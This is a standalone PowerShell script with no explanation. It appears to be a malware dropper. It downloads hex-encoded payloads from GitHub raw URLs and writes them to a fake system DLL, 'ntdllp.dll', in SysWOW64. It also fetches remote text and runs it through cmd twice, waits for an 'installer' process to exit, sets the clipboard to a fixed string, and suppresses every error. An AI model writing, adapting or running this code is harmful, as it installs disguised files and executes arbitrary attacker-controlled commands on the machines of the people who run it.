$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt"
$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
$clipText = "SteF6b2WrAgu"

function HexToBytes {
    param([string]$hexStr)
    $hexStr = $hexStr.Trim()
    $byteArr = [byte[]]::new($hexStr.Length / 2)
    for ($i = 0; $i -lt $hexStr.Length; $i += 2) {
        $byteArr[$i/2] = [convert]::ToByte($hexStr.Substring($i, 2), 16)
    }
    return $byteArr
}

try {
    $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing
    if ($responseA.StatusCode -eq 200) {
        $hexContent = $responseA.Content.Trim()
        if ($hexContent) {
            $bytes = HexToBytes $hexContent
            [IO.File]::WriteAllBytes($filePath, $bytes)
        }
    }
} catch {
}

Set-Clipboard $clipText

try {
    $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing
    if ($responseB.StatusCode -eq 200) {
        $cmdToRun = $responseB.Content.Trim()
        if ($cmdToRun) {
            Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
        }
    }
} catch {
}

do {
    Start-Sleep -Milliseconds 500
} while (Get-Process -Name "installer" -ErrorAction SilentlyContinue)

do {
    Start-Sleep -Milliseconds 100
} while (Get-Process -Name "installer" -ErrorAction SilentlyContinue)

try {
    $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing
    if ($responseC.StatusCode -eq 200) {
        $newHexContent = $responseC.Content.Trim()
        if ($newHexContent) {
            $newBytes = HexToBytes $newHexContent
            [IO.File]::WriteAllBytes($filePath, $newBytes)
        }
    }
} catch {
}

try {
    $responseD = Invoke-WebRequest -Uri $urlD -UseBasicParsing
    if ($responseD.StatusCode -eq 200) {
        $finalCmd = $responseD.Content.Trim()
        if ($finalCmd) {
            Start-Process cmd -ArgumentList "/c $finalCmd" -NoNewWindow
        }
    }
} catch {
}
